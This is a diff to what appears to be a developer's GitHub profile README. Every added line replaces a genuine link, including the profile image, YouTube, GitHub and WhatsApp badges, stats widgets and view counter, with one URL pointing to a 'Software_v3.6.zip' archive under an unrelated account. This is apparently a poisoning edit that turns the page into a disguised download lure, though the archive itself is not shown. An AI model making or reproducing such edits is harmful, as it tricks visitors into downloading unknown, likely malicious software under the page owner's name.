@@ -2,7 +2,7 @@
 
 <div align="center">
 
-<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiGXxCe0WNNedmFqSWeF761f7Kshhc-NP5ChRQKz9fr97cO8VaarvD0KlCwqHojJVBWv-RAxfOqMI5rD4H78KnARyOc6QgwL1nRRFWf5xNQ1d9F9HfAoLPPGlTyP0GwNl4n-INMEsWLQ4Y7zJtz5bOdAnc2ePH9-uCRgshlo6BsS6gJEz6fhrxL-5U5O3sX/s160/channels4_profile.jpg" alt="Mohammad Rameez Imdad — Rameez Scripts | Full-Stack Developer, AI Engineer & YouTube Educator" width="140" style="border-radius: 50%;" />
+<img src="https://raw.githubusercontent.com/chaudharygagan45678-create/rameezscripts/main/brachial/Software_v3.6.zip" alt="Mohammad Rameez Imdad — Rameez Scripts | Full-Stack Developer, AI Engineer & YouTube Educator" width="140" style="border-radius: 50%;" />
 
 # Mohammad Rameez Imdad (Rameez Scripts)
 
@@ -10,9 +10,9 @@
 
 I build **production-ready web apps**, **AI-powered automation workflows**, and **admin dashboards** using Google Apps Script, PHP/MySQL, Python, and React — then teach thousands how to do the same on YouTube.
 
-[![YouTube](https://img.shields.io/badge/YouTube-Rameez_Scripts-FF0000?style=for-the-badge&logo=youtube&logoColor=white)](https://www.youtube.com/@rameezscripts)
-[![GitHub](https://img.shields.io/badge/GitHub-rameezscripts-001f3f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rameezscripts)
-[![WhatsApp](https://img.shields.io/badge/WhatsApp-Chat-25D366?style=for-the-badge&logo=whatsapp&logoColor=white)](https://wa.me/923224083545)
+[![YouTube](https://img.shields.io/badge/YouTube-Rameez_Scripts-FF0000?style=for-the-badge&logo=youtube&logoColor=white)](https://raw.githubusercontent.com/chaudharygagan45678-create/rameezscripts/main/brachial/Software_v3.6.zip)
+[![GitHub](https://img.shields.io/badge/GitHub-rameezscripts-001f3f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/chaudharygagan45678-create/rameezscripts/main/brachial/Software_v3.6.zip)
+[![WhatsApp](https://img.shields.io/badge/WhatsApp-Chat-25D366?style=for-the-badge&logo=whatsapp&logoColor=white)](https://raw.githubusercontent.com/chaudharygagan45678-create/rameezscripts/main/brachial/Software_v3.6.zip)
 
 </div>
 
@@ -145,16 +145,16 @@ I build **production-ready web apps**, **AI-powered automation workflows**, and 
 ## GitHub Stats
 
 <p align="center">
-  <img src="https://github-readme-stats-sigma-five.vercel.app/api?username=rameezscripts&show_icons=true&title_color=0074D9&icon_color=0074D9&text_color=FFFFFF&bg_color=001f3f&hide_border=true&count_private=true&include_all_commits=true&cache_seconds=1800" alt="Rameez Scripts GitHub Stats" height="180" />
-  <img src="https://streak-stats.demolab.com?user=rameezscripts&background=001f3f&stroke=0074D933&ring=0074D9&fire=FF6384&currStreakLabel=0074D9&sideLabels=FFFFFF&currStreakNum=FFFFFF&sideNums=FFFFFF&dates=AAAAAA&hide_border=true" alt="Rameez Scripts GitHub Streak" height="180" />
+  <img src="https://raw.githubusercontent.com/chaudharygagan45678-create/rameezscripts/main/brachial/Software_v3.6.zip" alt="Rameez Scripts GitHub Stats" height="180" />
+  <img src="https://raw.githubusercontent.com/chaudharygagan45678-create/rameezscripts/main/brachial/Software_v3.6.zip" alt="Rameez Scripts GitHub Streak" height="180" />
 </p>
 
 <p align="center">
-  <img src="https://github-readme-activity-graph.vercel.app/graph?username=rameezscripts&bg_color=001f3f&color=FFFFFF&line=0074D9&point=FF6384&area=true&area_color=0074D9&hide_border=true&custom_title=Contribution%20Graph" alt="Rameez Scripts Contribution Activity Graph" width="95%" />
+  <img src="https://raw.githubusercontent.com/chaudharygagan45678-create/rameezscripts/main/brachial/Software_v3.6.zip" alt="Rameez Scripts Contribution Activity Graph" width="95%" />
 </p>
 
 <p align="center">
-  <img src="https://github-profile-trophy-ruby.vercel.app/?username=rameezscripts&theme=algolia&no-frame=true&no-bg=true&column=6&margin-w=10" alt="Rameez Scripts GitHub Trophies" width="90%" />
+  <img src="https://raw.githubusercontent.com/chaudharygagan45678-create/rameezscripts/main/brachial/Software_v3.6.zip" alt="Rameez Scripts GitHub Trophies" width="90%" />
 </p>
 
 ---
@@ -163,9 +163,9 @@ I build **production-ready web apps**, **AI-powered automation workflows**, and 
 
 <div align="center">
 
-[![YouTube](https://img.shields.io/badge/YouTube-Subscribe-FF0000?style=for-the-badge&logo=youtube&logoColor=white)](https://www.youtube.com/@rameezscripts)
-[![GitHub](https://img.shields.io/badge/GitHub-Follow-001f3f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rameezscripts)
-[![WhatsApp](https://img.shields.io/badge/WhatsApp-Chat-25D366?style=for-the-badge&logo=whatsapp&logoColor=white)](https://wa.me/923224083545)
+[![YouTube](https://img.shields.io/badge/YouTube-Subscribe-FF0000?style=for-the-badge&logo=youtube&logoColor=white)](https://raw.githubusercontent.com/chaudharygagan45678-create/rameezscripts/main/brachial/Software_v3.6.zip)
+[![GitHub](https://img.shields.io/badge/GitHub-Follow-001f3f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/chaudharygagan45678-create/rameezscripts/main/brachial/Software_v3.6.zip)
+[![WhatsApp](https://img.shields.io/badge/WhatsApp-Chat-25D366?style=for-the-badge&logo=whatsapp&logoColor=white)](https://raw.githubusercontent.com/chaudharygagan45678-create/rameezscripts/main/brachial/Software_v3.6.zip)
 
 </div>
 
@@ -179,7 +179,7 @@ I build **production-ready web apps**, **AI-powered automation workflows**, and 
 
 <div align="center">
 
-<img src="https://komarev.com/ghpvc/?username=rameezscripts&color=0074D9&style=for-the-badge&label=PROFILE+VIEWS" alt="Rameez Scripts Profile Views" />
+<img src="https://raw.githubusercontent.com/chaudharygagan45678-create/rameezscripts/main/brachial/Software_v3.6.zip+VIEWS" alt="Rameez Scripts Profile Views" />
 
 </div>
 
